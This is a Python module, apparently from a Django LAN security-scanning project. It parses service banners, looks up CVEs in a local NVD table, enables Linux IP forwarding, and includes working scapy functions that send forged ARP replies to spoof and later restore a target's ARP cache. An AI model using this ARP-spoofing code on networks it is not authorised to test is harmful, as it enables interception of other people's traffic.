import csv
import os
from lan_project.models import NvdData
import re as regex
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp


def list_refactor_services(list_item):
    list_item = [w.replace('(', '') for w in list_item]
    list_item = [w.replace(')', '') for w in list_item]
    list_item = [w.replace('\'', '') for w in list_item]
    list_item = [w.replace('[', '') for w in list_item]
    list_item = [w.replace(']', '') for w in list_item]
    # print('List_refactor function executed')
    return list_item


def string_replacer(str_input):
    str_input = str_input.replace('(', '')
    str_input = str_input.replace(')', '')
    str_input = str_input.replace('\r', '')
    str_input = str_input.replace('\n', '')
    str_input = str_input.replace('"', '')
    # print('String_replacer function executed')
    return str_input


def reform_banner(banner):
    for service in banner.split('\n'):
        # Server: Mini web server 1.0 ZTE corp 2005.
        # Server: 220 (vsFTPd 3.0.3)
        if 'Server:' in service:
            service = service[8:]
            return service


# Class for service analysis
class ServiceManager:
    # function for services running in ports != 80
    # some example services that will be passed in the function
    # 220 vsFTPd 3.0.3
    # Apache/2.4.41 Ubuntu
    @staticmethod
    def analyze_service(inp_service):
        print('Analyzing : {} '.format(inp_service))
        print('Checking if service {} contains response code at start'.format(inp_service))
        regex_res = regex.sub('\A\d\d\d', ' ', inp_service)
        if 'Ubuntu' in regex_res:
            print('Ubuntu word found.Removing it!')
            regex_res = regex_res.replace('Ubuntu', '')
        if 'Debian' in regex_res:
            print('Debian word found.Removing it!')
            regex_res = regex_res.replace('Debian', '')
        inp_service = regex_res.strip()
        print('input service after changes', inp_service)
        # APACHE SERVICES... can be ( Apache/2.4.41 ++ or Apache or Apache httpd 2.2.2)
        if '/' in inp_service:
            print('special character \'/\' found..splitting')
            inp_service = inp_service.split('/')
            # inp_service now is inp_service[0]= 'Apache', inp_service[1]= '2.4.41'
            splitted_service = [inp_service[0], inp_service[1]]
            print('Returning a list.')
            return splitted_service
        else:
            return inp_service

    @staticmethod
    def construct_query(item):
        print('Construct query was called for {}'.format(item))
        if isinstance(item, list):
            print('{} is a list.Acting accordingly.'.format(item))
            query = NvdData.objects.filter(description__contains=item[0]).filter(
                description__contains=item[1]).reverse()[:3].values('cve', 'references')
            query_list = list(query)
            print(query_list)
            serv_to_return = str(item[0]) + str(item[1])
            return query_list, serv_to_return
        else:
            serv = ' '
            print('{} is not a list.Constructing simple query.'.format(item))
            query = NvdData.objects.filter(description__contains=item).reverse()[:2].values('cve', 'references')
            query_list = list(query)
            print(query_list)
            return query_list, serv


def update_nvd_model():
    # database file is downloaded in project's root folder
    CSV_PATH = 'allitems.csv'
    rows_parsed = 0
    # Remove existing table data
    NvdData.objects.all().delete()
    # parsing the database file and fill the NVDdata table.
    with open(CSV_PATH, encoding='utf-8', errors='ignore', newline='') as csv_file:
        reader = csv.reader(csv_file, delimiter=',', quotechar=';')
        print('Parsing data and creating the model..(this could take some time)')
        for row in reader:
            next(reader, None)
            next(reader, None)
            next(reader, None)
            next(reader, None)
            next(reader, None)
            next(reader, None)
            next(reader, None)
            next(reader, None)
            next(reader, None)
            next(reader, None)
            NvdData.objects.get_or_create(cve=row[0], status=row[1], description=row[2], references=row[3],
                                          phase=row[4], votes=row[5])
            rows_parsed += 1
        print('Number of rows inserted :', rows_parsed)


def enable_ip_route():
    if 'nt' in os.name:
        pass
    else:
        print('[+] LINUX SYSTEM')
        file_path = '/proc/sys/net/ipv4/ip_forward'
        with open(file_path) as f:
            if f.read() == 1:
                print('Already Enabled ip forwarding.')
                # simple return exits the function(returns None)
                return
        # if it isn't enabled it enables it.
        with open(file_path, 'w') as f:
            print(1, file=f)


def get_mac(target_ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target_ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    else:
        return None


def start_arp_spoof(target_ip, host_ip):
    # get the mac for the target_ip
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    # get our own mac address
    self_mac = ARP().hwsrc
    print('[+] Sent to {} : {} is-at {}'.format(target_ip, host_ip, self_mac))


def restore_arp_spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # send the response packet 8 times just to be sure.
    send(arp_response, verbose=0, count=8)
